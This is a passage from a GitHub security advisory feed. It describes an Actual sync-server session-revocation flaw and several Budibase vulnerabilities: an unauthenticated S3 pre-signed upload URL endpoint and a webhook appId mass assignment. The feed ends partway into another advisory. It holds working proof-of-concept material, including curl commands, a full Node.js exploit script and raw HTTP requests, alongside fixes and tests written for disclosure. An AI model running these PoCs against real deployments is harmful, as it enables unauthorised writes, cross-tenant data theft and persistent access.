<p>Admins can change a user's enabled state through the user update route, but that update does not delete the user's existing sessions. After the update, the old token still satisfies <code>validateSession</code>.</p>
<pre><code class="language-js">// packages/sync-server/src/app-admin.js:91-101
app.patch('/users', validateSessionMiddleware, async (req, res) =&gt; {
  if (!isAdmin(res.locals.user_id)) {
    ...
  }

  const { id, userName, role, displayName, enabled } = req.body || {};
</code></pre>
<pre><code class="language-ts">// packages/sync-server/src/services/user-service.ts:98-102
getAccountDb().mutate(
  'UPDATE users SET user_name = ?, display_name = ?, enabled = ?, role = ? WHERE id = ?',
  [userName, displayName, enabled, roleId, userId],
);
</code></pre>
<p>Authenticated server features then continue to trust that session. For example, the sync API installs <code>validateSessionMiddleware</code> for the whole router, so a disabled user can keep using any sync operation that their still-valid session and existing file ownership/access allow.</p>
<pre><code class="language-ts">// packages/sync-server/src/app-sync.ts:37-39
const app = express();
app.use(validateSessionMiddleware);
app.use(errorMiddleware);
</code></pre>
<p>This is distinct from the previously published cross-user sync authorization issue: the attacker does not need to access another user's file ID. The bypass is that a disabled user's own session remains authorized after account disablement.</p>
<h3 id="poc">PoC</h3>
<ol>
<li>Run an Actual Sync Server in OpenID multi-user mode with <code>@actual-app/sync-server</code> 26.5.0. Use the default token expiration setting, or any setting where the token has not expired yet.</li>
<li>Log in as a non-admin OpenID user and save the returned Actual session token.</li>
<li>As an admin, disable that same user through <code>PATCH /admin/users</code> by sending <code>enabled: false</code>.</li>
<li>Reuse the old token against a protected endpoint.</li>
</ol>
<p>Example success check:</p>
<pre><code class="language-bash">curl -s https://actual.example.com/account/validate \
  -H 'X-Actual-Token: &lt;disabled_user_existing_token&gt;'
</code></pre>
<p>Expected result on the affected code path: the request is still treated as authenticated and returns the disabled user's account/session information instead of <code>401</code> or <code>403</code>.</p>
<p>A sync-facing check uses the same session validation primitive:</p>
<pre><code class="language-bash">curl -s https://actual.example.com/sync/list-user-files \
  -H 'X-Actual-Token: &lt;disabled_user_existing_token&gt;'
</code></pre>
<p>Expected result on the affected code path: the disabled user can still list and operate on budget files that the stale session is otherwise allowed to access.</p>
<h3 id="impact">Impact</h3>
<p>A disabled OpenID user can keep post-authentication access until the session row is deleted or expires. With the default <code>token_expiration: never</code>, this can persist indefinitely.</p>
<p>For a disabled basic user, the confirmed impact is continued access to that user's own budgets and any budgets shared with that user, including sensitive financial data and allowed mutations. For a disabled admin user, the impact is broader because the existing token can still satisfy admin role checks; that condition preserves administrative access after the account was disabled.</p>
<p>The missing rule is that session validation should reject disabled users, and disabling or deleting a user should revoke that user's existing sessions.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/actualbudget/actual/security/advisories/GHSA-cq9c-6w48-qmfg">https://github.com/actualbudget/actual/security/advisories/GHSA-cq9c-6w48-qmfg</a></li>
<li><a href="https://github.com/advisories/GHSA-cq9c-6w48-qmfg">https://github.com/advisories/GHSA-cq9c-6w48-qmfg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cq9c-6w48-qmfg</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-22T23:19:56.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@budibase/server] Budibase: POST /api/attachments/:datasourceId/url is unauthenticated and lets anonymous callers mint S3 PUT pre-signed URLs using stored datasource IAM credentials]]></title>
        <id>https://github.com/advisories/GHSA-35c4-rvc8-frhm</id>
        <link href="https://github.com/advisories/GHSA-35c4-rvc8-frhm"/>
        <updated>2026-06-22T23:20:56.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The Budibase server route <code>POST /api/attachments/:datasourceId/url</code> (<a href="https://github.com/Budibase/budibase/blob/56d2a984/packages/server/src/api/routes/static.ts"><code>packages/server/src/api/routes/static.ts</code></a>) is registered with <strong>only</strong> the <code>recaptcha</code> middleware. There is no <code>authorized(...)</code> middleware in the chain. The controller (<code>packages/server/src/api/controllers/static/index.ts::getSignedUploadURL</code>) looks the requested datasource up, instantiates an AWS S3 client with the datasource's stored <code>accessKeyId</code> / <code>secretAccessKey</code>, and returns an AWS Signature V4 pre-signed <code>PutObjectCommand</code> URL for the caller-supplied <code>bucket</code> and <code>key</code>. The <code>bucket</code> is not pinned to the datasource's configured bucket.</p>
<p>The workspace context required by <code>sdk.datasources.get</code> is sourced by <code>getWorkspaceIdFromCtx</code> (<a href="https://github.com/Budibase/budibase/blob/56d2a984/packages/backend-core/src/utils/utils.ts"><code>packages/backend-core/src/utils/utils.ts</code></a>) from any of: the <code>x-budibase-app-id</code> header, the JSON body <code>appId</code>, a path segment that begins with the workspace prefix, or <code>?appId=</code>. <code>auth.buildAuthMiddleware([], { publicAllowed: true })</code> runs before any of this and explicitly allows anonymous requests. The <code>currentWorkspace</code> middleware's "deny access to dev preview" branch only triggers under <code>isBrowser(ctx) &amp;&amp; !isApiKey(ctx)</code>; <code>isBrowser</code> checks the parsed <code>User-Agent</code> for a recognised browser, so any non-browser client (curl, the supplied PoC, any tool not setting a browser UA) is neither and reaches dev workspaces too.</p>
<p>Net effect: an anonymous attacker who knows or can enumerate a workspace id (<code>app_...</code>) and an S3-source datasource id (<code>ds_...</code>) can call this endpoint with no auth and obtain a 15-minute pre-signed PUT URL minted on the victim's IAM identity. The endpoint also returns the <code>publicUrl</code> so the attacker knows exactly where their PUT lands. Because <code>bucket</code> is attacker-controlled, the attacker can write to any bucket those IAM credentials can write to, not only the bucket the datasource was configured for.</p>
<h2 id="affected-code">Affected code</h2>
<p><a href="https://github.com/Budibase/budibase/blob/56d2a984/packages/server/src/api/routes/static.ts"><code>packages/server/src/api/routes/static.ts</code></a> at HEAD <code>56d2a984</code> (<code>master</code>, 2026-05-18):</p>
<pre><code class="language-ts">import { permissions } from "@budibase/backend-core"
import Router from "@koa/router"
import { authorizedMiddleware as authorized } from "../../middleware/authorized"
import recaptcha from "../../middleware/recaptcha"
import { paramResource } from "../../middleware/resourceId"
import * as controller from "../controllers/static"

const { BUILDER, PermissionType, PermissionLevel } = permissions

const router: Router = new Router()
// ...
router
  .post("/api/attachments/process", authorized(BUILDER), controller.uploadFile)
  .post("/api/pwa/process-zip", authorized(BUILDER), controller.processPWAZip)
  .post(
    "/api/attachments/:tableId/upload",
    recaptcha,
    paramResource("tableId"),
    authorized(PermissionType.TABLE, PermissionLevel.WRITE),
    controller.uploadFile
  )
  // ...
  .post(
    "/api/attachments/:datasourceId/url",
    recaptcha,
    controller.getSignedUploadURL                       // &lt;- no authorized(...)
  )
</code></pre>
<p>Note the asymmetry: every other mutating endpoint on this router carries an <code>authorized(...)</code> middleware. The signed-URL endpoint does not.</p>
<p><a href="https://github.com/Budibase/budibase/blob/56d2a984/packages/server/src/api/controllers/static/index.ts#L595-L645"><code>packages/server/src/api/controllers/static/index.ts:595-645</code></a>:</p>
<pre><code class="language-ts">export const getSignedUploadURL = async function (ctx) {
  let datasource
  try {
    const { datasourceId } = ctx.params
    datasource = await sdk.datasources.get(datasourceId, { enriched: true })
    if (!datasource) {
      ctx.throw(400, "The specified datasource could not be found")
    }
  } catch (error) {
    ctx.throw(400, "The specified datasource could not be found")
  }

  let signedUrl, publicUrl
  const awsRegion = (datasource?.config?.region || "eu-west-1") as string
  if (datasource?.source === "S3") {
    const { bucket, key } = ctx.request.body || {}
    if (!bucket || !key) {
      ctx.throw(400, "bucket and key values are required")
    }
    try {
      let endpoint = datasource?.config?.endpoint
      if (endpoint &amp;&amp; !utils.urlHasProtocol(endpoint)) {
        endpoint = `https://${endpoint}`
      }
      const s3 = new S3({
        region: awsRegion,
        endpoint,
        credentials: {
          accessKeyId: datasource?.config?.accessKeyId as string,
          secretAccessKey: datasource?.config?.secretAccessKey as string,
        },
      })
      const params = { Bucket: bucket, Key: key }
      signedUrl = await getSignedUrl(s3, new PutObjectCommand(params))
      if (endpoint) {
        publicUrl = `${endpoint}/${bucket}/${key}`
      } else {
        publicUrl = `https://${bucket}.s3.${awsRegion}.amazonaws.com/${key}`
      }
    } catch (error: any) {
      ctx.throw(400, error)
    }
  }

  ctx.body = { signedUrl, publicUrl }
}
</code></pre>
<p><code>sdk.datasources.get(datasourceId, { enriched: true })</code> (<a href="https://github.com/Budibase/budibase/blob/56d2a984/packages/server/src/sdk/workspace/datasources/datasources.ts"><code>packages/server/src/sdk/workspace/datasources/datasources.ts</code></a>) does the workspace DB read and <strong>also</strong> substitutes <code>{{ env.* }}</code> references in the config via <code>processObjectSync</code>, so even if the operator stored credentials as environment-variable references, those values are resolved before the S3 client is built.</p>
<p><code>recaptcha</code> (<a href="https://github.com/Budibase/budibase/blob/56d2a984/packages/server/src/middleware/recaptcha.ts"><code>packages/server/src/middleware/recaptcha.ts</code></a>) short-circuits to <code>next()</code> whenever the workspace either is not a production workspace or does not have <code>features.recaptchaEnabled = true</code> on its metadata. Neither is set by default. Even on workspaces with recaptcha enabled, builders carrying the <code>x-budibase-type: builder</code> header skip the check, but that branch is irrelevant here — the broader case is that an anonymous attacker simply chooses a non-prod workspace (which is the default for any in-development app) and the middleware no-ops.</p>
<h2 id="reproduction">Reproduction</h2>
<p>Proof-of-concept Node.js script (no AWS SDK dependency, no external libraries):</p>
<pre><code class="language-js">#!/usr/bin/env node
// PoC: Unauthenticated S3 signed-upload-URL minting in Budibase
// usage: node poc.js &lt;budibase-base-url&gt; &lt;app-id&gt; &lt;datasource-id&gt;

"use strict"
const http = require("http")
const https = require("https")
const { URL } = require("url")

function postJson(targetUrl, headers, body) {
  return new Promise((resolve, reject) =&gt; {
    const u = new URL(targetUrl)
    const lib = u.protocol === "https:" ? https : http
    const payload = Buffer.from(JSON.stringify(body), "utf8")
    const req = lib.request(
      {
        method: "POST",
        protocol: u.protocol,
        hostname: u.hostname,
        port: u.port || (u.protocol === "https:" ? 443 : 80),
        path: u.pathname + u.search,
        headers: Object.assign(
          {
            "Content-Type": "application/json",
            "Content-Length": payload.length,
            // Deliberately not a recognised browser UA so the
            // currentWorkspace dev-preview redirect does not fire.
            "User-Agent": "budibase-poc/1.0",
          },
          headers || {}
        ),
      },
      res =&gt; {
        const chunks = []
        res.on("data", c =&gt; chunks.push(c))
        res.on("end", () =&gt;
          resolve({
            status: res.statusCode,
            body: Buffer.concat(chunks).toString("utf8"),
          })
        )
      }
    )
    req.on("error", reject)
    req.write(payload)
    req.end()
  })
}

async function main() {
  const [baseUrl, appId, datasourceId] = process.argv.slice(2)
  if (!baseUrl || !appId || !datasourceId) {
    console.error("usage: node poc.js &lt;baseUrl&gt; &lt;appId&gt; &lt;datasourceId&gt;")
    process.exit(2)
  }
  const bucket = process.env.POC_BUCKET || "attacker-chosen-bucket"
  const key = process.env.POC_KEY || `pwn/${Date.now()}.html`
  const url = baseUrl.replace(/\/$/, "") +
    `/api/attachments/${encodeURIComponent(datasourceId)}/url`
  const resp = await postJson(
    url,
    { "x-budibase-app-id": appId },
    { bucket, key }
  )
  console.log(`HTTP ${resp.status}`)
  console.log(resp.body)
}

main().catch(err =&gt; {
  console.error(err)
  process.exit(1)
})
</code></pre>
<p>Wire-level request:</p>
<pre><code>POST /api/attachments/ds_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx/url HTTP/1.1
Host: budibase.example:10000
x-budibase-app-id: app_dev_yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy
Content-Type: application/json
User-Agent: budibase-poc/1.0
Content-Length: 36

{"bucket":"victim-bucket","key":"x.html"}
</code></pre>
<p>Response:</p>
<pre><code>HTTP/1.1 200 OK
Content-Type: application/json

{
  "signedUrl": "https://victim-bucket.s3.eu-west-1.amazonaws.com/x.html?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=AKIA...%2F20260519%2Feu-west-1%2Fs3%2Faws4_request&amp;X-Amz-Date=20260519T120000Z&amp;X-Amz-Expires=900&amp;X-Amz-Signature=...&amp;X-Amz-SignedHeaders=host&amp;x-id=PutObject",
  "publicUrl": "https://victim-bucket.s3.eu-west-1.amazonaws.com/x.html"
}
</code></pre>
<p>The attacker then PUTs arbitrary bytes to <code>signedUrl</code> and they land at <code>publicUrl</code>, signed by — and IAM-scoped to — the victim's stored S3 credentials.</p>
<p>The existing test that exercises the endpoint, <a href="https://github.com/Budibase/budibase/blob/56d2a984/packages/server/src/api/routes/tests/static.spec.ts#L123-L146"><code>packages/server/src/api/routes/tests/static.spec.ts:123-146</code></a>, sends the same request with <code>config.defaultHeaders()</code> (a builder auth cookie). That confirms the request shape; no negative-auth test (<code>.set({})</code> or <code>publicHeaders()</code>) exists for this route, which is how the missing <code>authorized(...)</code> slipped past code review.</p>
<h2 id="impact">Impact</h2>
<ul>
<li><strong>Confidentiality / Integrity</strong>: any anonymous internet user can write arbitrary objects to any bucket the configured IAM credentials can write to. The <code>bucket</code> parameter is attacker-controlled, so the blast radius is the full IAM policy attached to the credential, not just the bucket the operator wired into the datasource. Typical realistic outcomes: planting HTML/JS that the bucket serves at a known path (the response gives back <code>publicUrl</code>), overwriting an existing key the application later reads back as trusted data, racking up S3 storage / PUT cost.</li>
<li><strong>Availability</strong>: storage / cost exhaustion. Repeated PUTs of large objects to attacker-chosen keys cost the victim.</li>
<li><strong>Authorization scope leak</strong>: the endpoint discloses (a) whether a given <code>datasourceId</code> exists and is S3-typed (200 vs 400 'not found'), and (b) the resolved <code>publicUrl</code> which includes the region.</li>
</ul>
<p>No MFA / OAuth / per-user check exists between the request and the issued pre-signed URL. The credentials are not returned in plaintext, but the pre-signed URL is functionally equivalent to a 15-minute capability to PUT to the chosen <code>bucket</code>/<code>key</code>.</p>
<h2 id="suggested-fix">Suggested fix</h2>
<p>Attach <code>authorized(PermissionType.TABLE, PermissionLevel.WRITE)</code> (or a higher gate, e.g. <code>BUILDER</code>, depending on intended audience) to the route, mirroring the sibling <code>/api/attachments/:tableId/upload</code> registration. Additionally, validate that the requested <code>bucket</code> matches <code>datasource.config.bucket</code> so the IAM blast radius is reduced to the configured bucket only.</p>
<p>Minimal patch shape:</p>
<pre><code class="language-ts">.post(
  "/api/attachments/:datasourceId/url",
  recaptcha,
  paramResource("datasourceId"),
  authorized(PermissionType.TABLE, PermissionLevel.WRITE),
  controller.getSignedUploadURL
)
</code></pre>
<p>And in the controller, before calling <code>getSignedUrl</code>:</p>
<pre><code class="language-ts">const configuredBucket = datasource?.config?.bucket
if (configuredBucket &amp;&amp; bucket !== configuredBucket) {
  ctx.throw(400, "bucket does not match configured datasource bucket")
}
</code></pre>
<h2 id="credit">Credit</h2>
<p>Reported by <code>tonghuaroot</code> (<code>tonghuaroot@gmail.com</code>).</p>
<h2 id="fix-pr">Fix PR</h2>
<p>A candidate fix has been prepared on the temporary private fork that was created from this advisory:</p>
<ul>
<li>PR: <a href="https://github.com/Budibase/budibase-ghsa-35c4-rvc8-frhm/pull/1">https://github.com/Budibase/budibase-ghsa-35c4-rvc8-frhm/pull/1</a></li>
<li>Branch: <code>fix/attachment-url-auth-and-bucket-pin</code></li>
<li>Commit: <code>Require builder auth and pin bucket on POST /api/attachments/:datasourceId/url</code></li>
</ul>
<p>The patch is the canonical two-part fix:</p>
<ol>
<li>Attach <code>authorized(BUILDER)</code> to <code>POST /api/attachments/:datasourceId/url</code> on <a href="https://github.com/Budibase/budibase/blob/56d2a984/packages/server/src/api/routes/static.ts"><code>packages/server/src/api/routes/static.ts</code></a>, mirroring the surrounding <code>POST /api/attachments/process</code> and <code>POST /api/pwa/process-zip</code> registrations. Anonymous callers now receive 401 regardless of whether the <code>recaptcha</code> middleware fails open.</li>
<li>Pin <code>Bucket</code> to <code>datasource.config.bucket</code> inside <code>getSignedUploadURL</code> (<a href="https://github.com/Budibase/budibase/blob/56d2a984/packages/server/src/api/controllers/static/index.ts"><code>packages/server/src/api/controllers/static/index.ts</code></a>) and ignore any <code>bucket</code> value supplied in the request body. If the datasource has no bucket configured, the route now returns 400 instead of issuing an unbounded pre-signed URL.</li>
</ol>
<p>Two regression tests are added in <a href="https://github.com/Budibase/budibase/blob/56d2a984/packages/server/src/api/routes/tests/static.spec.ts"><code>packages/server/src/api/routes/tests/static.spec.ts</code></a>:</p>
<ul>
<li><code>should reject unauthenticated callers</code> (anonymous request with <code>config.publicHeaders()</code> now returns 401, was 200 before).</li>
<li><code>should ignore a client-supplied bucket and pin to the datasource's configured bucket</code> (authenticated request with body <code>{ bucket: "other-bucket", key: "bar" }</code> returns a signed URL bound to <code>foo.s3.eu-west-1.amazonaws.com/bar</code>, not <code>other-bucket</code>).</li>
</ul>
<p>Test run on the patch (Jest, <code>packages/server</code>):</p>
<pre><code>PASS src/api/routes/tests/static.spec.ts
  /static
    /attachments
      generateSignedUrls
        v should be able to generate a signed upload URL
        v should reject unauthenticated callers
        v should ignore a client-supplied bucket and pin to the datasource's configured bucket
        v should reject when the datasource has no configured bucket
        v should handle an invalid datasource ID
        v should require a key parameter
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Budibase/budibase/security/advisories/GHSA-35c4-rvc8-frhm">https://github.com/Budibase/budibase/security/advisories/GHSA-35c4-rvc8-frhm</a></li>
<li><a href="https://github.com/advisories/GHSA-35c4-rvc8-frhm">https://github.com/advisories/GHSA-35c4-rvc8-frhm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-35c4-rvc8-frhm</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-22T23:19:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@budibase/server] Budibase: Mass Assignment in Webhook Trigger Allows Cross-Workspace Automation Execution via appId Override]]></title>
        <id>https://github.com/advisories/GHSA-rgvg-3wpc-h44p</id>
        <link href="https://github.com/advisories/GHSA-rgvg-3wpc-h44p"/>
        <updated>2026-06-22T23:20:55.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The webhook trigger endpoint in Budibase is publicly accessible and passes the full HTTP request body into automation execution parameters. A mass assignment vulnerability in <code>externalTrigger()</code> allows an attacker to overwrite the internal <code>appId</code> property by including it in the webhook POST body. When the automation is processed asynchronously (the default path for webhooks without a collect step), the worker executes the attacker-defined automation in the context of the victim's workspace, granting full read/write access to the victim's database.</p>
<h2 id="details">Details</h2>
<p>The webhook trigger route is registered as a public endpoint with no authentication:</p>
<pre><code class="language-typescript">// packages/server/src/api/routes/webhook.ts:12
publicRoutes.post("/api/webhooks/trigger/:instance/:id", controller.trigger)
</code></pre>
<p>The controller passes the raw request body as <code>fields</code> alongside the server-derived <code>appId</code>:</p>
<pre><code class="language-typescript">// packages/server/src/api/controllers/webhook.ts:142-148
await triggers.externalTrigger(target, {
  fields: {
    ...ctx.request.body,  // attacker-controlled
    body: ctx.request.body,
  },
  appId: prodAppId,       // server-controlled
})
</code></pre>
<p>In <code>externalTrigger()</code>, for webhook-triggered automations, <code>params.fields</code> is spread back into <code>params</code>:</p>
<pre><code class="language-typescript">// packages/server/src/automations/triggers.ts:237-241
params = {
  ...params,          // appId: prodAppId (server-controlled)
  ...params.fields,   // appId: VICTIM_ID (attacker-controlled, overwrites above)
  fields: {},
}
</code></pre>
<p>Because <code>params.fields</code> is spread <strong>after</strong> <code>params</code>, any key in the attacker's body overwrites the corresponding property in <code>params</code>. An attacker including <code>"appId": "app_VICTIM_WORKSPACE_ID"</code> in the POST body overwrites the legitimate, server-derived <code>appId</code>.</p>
<p>The contaminated params become <code>data.event</code> and are queued asynchronously:</p>
<pre><code class="language-typescript">// packages/server/src/automations/triggers.ts:244,271
const data: AutomationData = { automation, event: params }
// ...
return quotas.addAction(() =&gt; automationQueue.add(data, JOB_OPTS))
</code></pre>
<p>The async worker uses <code>job.data.event.appId</code> to set the workspace context:</p>
<pre><code class="language-typescript">// packages/server/src/threads/automation.ts:917,929-930
const workspaceId = job.data.event.appId  // attacker-controlled
// ...
return await context.doInAutomationContext({
  workspaceId,  // victim's workspace
  automationId,
  task: async () =&gt; { /* automation steps run here */ }
})
</code></pre>
<p>The synchronous path (for webhooks with a collect step) correctly overwrites <code>appId</code> at <code>triggers.ts:264</code>:</p>
<pre><code class="language-typescript">data.event = {
  ...data.event,
  appId: context.getWorkspaceId(),  // server-controlled fix
  automation,
}
</code></pre>
<p>This proves the developers intended <code>appId</code> to be server-controlled but missed applying the same fix to the async path, which is the default for all webhooks without a collect step.</p>
<h2 id="poc">PoC</h2>
<p><strong>Prerequisites:</strong> Attacker has builder access to their own Budibase workspace and knows a victim workspace ID (format: <code>app_&lt;uuid&gt;</code>).</p>
<p><strong>Step 1:</strong> Attacker creates an automation in their own workspace with a webhook trigger and data-exfiltration steps (e.g., Query Rows → Execute Script to send data externally).</p>
<p><strong>Step 2:</strong> Attacker creates a webhook for that automation and notes the webhook URL:</p>
<pre><code>POST /api/webhooks/trigger/&lt;ATTACKER_INSTANCE&gt;/&lt;WEBHOOK_ID&gt;
</code></pre>
<p><strong>Step 3:</strong> Attacker triggers the webhook with the victim's workspace ID injected into the body:</p>
<pre><code class="language-bash">curl -X POST https://budibase.example.com/api/webhooks/trigger/app_ATTACKER_ID/wh_WEBHOOK_ID \
  -H 'Content-Type: application/json' \
  -d '{"appId": "app_VICTIM_WORKSPACE_ID", "normalData": "test"}'
</code></pre>
<p><strong>Expected result:</strong> The automation defined in the attacker's workspace executes in the context of the victim's workspace. All database operations (Query Rows, Create Row, Delete Row, Execute Script, etc.) operate on the victim's data.</p>
<p><strong>Additional overridable fields via the same mechanism:</strong></p>
<ul>
<li><code>timeout</code> (<code>automation.ts:443-444</code>): override automation execution timeout</li>
<li><code>user</code> (<code>automation.ts:413,435</code>): set user context for automation steps</li>
<li><code>metadata.automationChainCount</code> (<code>automation.ts:293</code>): bypass chain depth limits</li>
</ul>
<h2 id="impact">Impact</h2>
<p>An attacker with builder access to their own Budibase workspace can execute arbitrary automations (of their own design) in the context of any other workspace on the same Budibase instance, provided they know the victim's workspace ID. This enables:</p>
<ul>
<li><strong>Full data exfiltration</strong>: Query Rows steps read all tables in the victim's workspace</li>
<li><strong>Data manipulation</strong>: Create Row, Update Row, Delete Row steps modify victim data</li>
<li><strong>Arbitrary code execution in victim context</strong>: Execute Script steps run JavaScript with access to victim's environment variables and database</li>
<li><strong>Cross-tenant boundary violation</strong>: In multi-tenant deployments (Budibase Cloud), the tenant ID is derived from the workspace ID, so the attack crosses tenant boundaries</li>
</ul>
<p>The attack requires no authentication (the webhook endpoint is public) and leaves minimal audit trail since the automation execution is attributed to the attacker's automation definition but runs in the victim's context.</p>
<h2 id="recommended-fix">Recommended Fix</h2>
<p>In <code>packages/server/src/automations/triggers.ts</code>, apply the same <code>appId</code> fix that exists in the synchronous path to the async path as well. The fix should ensure <code>appId</code> is always server-controlled before queuing:</p>
<pre><code class="language-typescript">// packages/server/src/automations/triggers.ts:244-272
const data: AutomationData = { automation, event: params }

// ... trigger filter check ...

+ // Ensure appId is always server-controlled, not user-supplied
+ data.event.appId = context.getWorkspaceId()

if (getResponses) {
  data.event = {
    ...data.event,
    appId: context.getWorkspaceId(),
    automation,
  }
  return quotas.addAction(() =&gt;
    executeInThread({ data } as AutomationJob, { onProgress })
  )
} else {
  return quotas.addAction(() =&gt; automationQueue.add(data, JOB_OPTS))
}
</code></pre>
<p>Alternatively, use an allowlist approach for the webhook field spread to prevent any internal property from being overwritten:</p>
<pre><code class="language-typescript">// packages/server/src/automations/triggers.ts:237-241
const { appId, timeout, user, metadata, ...safeFields } = params.fields
params = {
  ...params,
  ...safeFields,
  fields: {},
}
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Budibase/budibase/security/advisories/GHSA-rgvg-3wpc-h44p">https://github.com/Budibase/budibase/security/advisories/GHSA-rgvg-3wpc-h44p</a></li>
<li><a href="https://github.com/advisories/GHSA-rgvg-3wpc-h44p">https://github.com/advisories/GHSA-rgvg-3wpc-h44p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rgvg-3wpc-h44p</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-22T23:20:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@budibase/server] Budibase: Unauthenticated S3 signed upload URL generation allows arbitrary writes with stored datasource credentials]]></title>
        <id>https://github.com/advisories/GHSA-jj36-r9w3-3pfh</id>
        <link href="https://github.com/advisories/GHSA-jj36-r9w3-3pfh"/>
        <updated>2026-06-22T23:15:11.000Z</updated>
        <content type="html"><![CDATA[<p>The application server exposes an unauthenticated endpoint that generates S3 <code>PutObject</code> presigned URLs using credentials stored in a workspace datasource. The route is protected only by the recaptcha middleware and does not require authentication, table permission, datasource permission, or builder access. A public caller who knows a workspace ID and S3 datasource ID can request a signed upload URL for attacker-controlled bucket and key values.</p>
<h3 id="details">Details</h3>
<p>The static route registers the signed upload URL endpoint with only <code>recaptcha</code> before the controller:</p>
<ul>
<li><code>packages/server/src/api/routes/static.ts:44-48</code></li>
</ul>
<pre><code class="language-ts">44:  .post(
45:    "/api/attachments/:datasourceId/url",
46:    recaptcha,
47:    controller.getSignedUploadURL
48:  )
</code></pre>
<p>The controller loads the datasource by <code>datasourceId</code> with enriched secret values:</p>
<ul>
<li><code>packages/server/src/api/controllers/static/index.ts:590-598</code></li>
</ul>
<pre><code class="language-ts">590:export const getSignedUploadURL = async function (
591:  ctx: Ctx&lt;GetSignedUploadUrlRequest, GetSignedUploadUrlResponse&gt;
592:) {
593:  // Ensure datasource is valid
594:  let datasource
595:  try {
596:    const { datasourceId } = ctx.params
597:    datasource = await sdk.datasources.get(datasourceId, { enriched: true })
598:    if (!datasource) {
</code></pre>
<p>The request body controls <code>bucket</code> and <code>key</code>, and the server signs a PUT URL using the stored datasource credentials:</p>
<ul>
<li><code>packages/server/src/api/controllers/static/index.ts:609-629</code></li>
</ul>
<pre><code class="language-ts">609:  if (datasource?.source === "S3") {
610:    const { bucket, key } = ctx.request.body || {}
611:    if (!bucket || !key) {
612:      ctx.throw(400, "bucket and key values are required")
613:    }
614:    try {
615:      let endpoint = datasource?.config?.endpoint
616:      if (endpoint &amp;&amp; !utils.urlHasProtocol(endpoint)) {
617:        endpoint = `https://${endpoint}`
618:      }
619:      const s3 = new S3({
620:        region: awsRegion,
621:        endpoint: endpoint,
622:        credentials: {
623:          accessKeyId: datasource?.config?.accessKeyId as string,
624:          secretAccessKey: datasource?.config?.secretAccessKey as string,
625:        },
626:      })
627:      const params = { Bucket: bucket, Key: key }
628:      signedUrl = await getSignedUrl(s3, new PutObjectCommand(params))
629:      if (endpoint) {
</code></pre>
<p>The endpoint returns the signed URL and public URL to the caller:</p>
<ul>
<li><code>packages/server/src/api/controllers/static/index.ts:630-639</code></li>
</ul>
<pre><code class="language-ts">630:        publicUrl = `${endpoint}/${bucket}/${key}`
631:      } else {
632:        publicUrl = `https://${bucket}.s3.${awsRegion}.amazonaws.com/${key}`
633:      }
634:    } catch (error: any) {
635:      ctx.throw(400, error)
636:    }
637:  }
638:
639:  ctx.body = { signedUrl, publicUrl }
</code></pre>
<p>Because no authorization middleware is applied, the API trusts public input to choose where the stored S3 credentials will write.</p>
<h3 id="poc">PoC</h3>
<p>Non-destructive validation approach:</p>
<ol>
<li>Create or identify a workspace with an S3 datasource.</li>
<li>Obtain the production workspace ID and S3 datasource ID.</li>
<li>Send an unauthenticated request with the workspace ID header and attacker-controlled bucket/key:</li>
</ol>
<pre><code class="language-http">POST /api/attachments/&lt;datasourceId&gt;/url HTTP/1.1
x-budibase-app-id: app_&lt;workspace-id&gt;
content-type: application/json

{"bucket":"attacker-controlled-or-permitted-bucket","key":"poc/budibase.txt"}
</code></pre>
<ol start="4">
<li>Observe that the response contains a signed PUT URL.</li>
<li>Upload harmless content to the returned <code>signedUrl</code> and confirm the object is created using the datasource's stored S3 credentials.</li>
</ol>
<h3 id="impact">Impact</h3>
<p>This allows unauthenticated arbitrary object writes wherever the stored S3 datasource credentials have <code>PutObject</code> access. Depending on the datasource permissions, this can corrupt application data, overwrite public assets, place attacker-controlled objects in trusted buckets, consume storage, or abuse an organization's cloud credentials.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Budibase/budibase/security/advisories/GHSA-jj36-r9w3-3pfh">https://github.com/Budibase/budibase/security/advisories/GHSA-jj36-r9w3-3pfh</a></li>
<li><a href="https://github.com/Budibase/budibase/pull/18774">https://github.com/Budibase/budibase/pull/18774</a></li>
<li><a href="https://github.com/Budibase/budibase/commit/d9dbb7f6105373cc88ecacdbcab70c776f7dd6a1">https://github.com/Budibase/budibase/commit/d9dbb7f6105373cc88ecacdbcab70c776f7dd6a1</a></li>
<li><a href="https://github.com/advisories/GHSA-jj36-r9w3-3pfh">https://github.com/advisories/GHSA-jj36-r9w3-3pfh</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jj36-r9w3-3pfh</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-22T23:15:10.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@budibase/server] Budibase has an Account Impersonation Issue — Chat Identity Link Hijacking via Missing Consent & CSRF]]></title>
        <id>https://github.com/advisories/GHSA-v7j5-vc4m-723w</id>
        <link href="https://github.com/advisories/GHSA-v7j5-vc4m-723w"/>
        <updated>2026-06-22T23:08:23.000Z</updated>
        <content type="html"><![CDATA[<h2>Title</h2>
<p><strong>Chat Identity Link Hijacking — Attacker Can Silently Map Their Slack/Discord Identity to Any Authenticated Budibase User's Account</strong></p>
<h2 id="severity">Severity</h2>
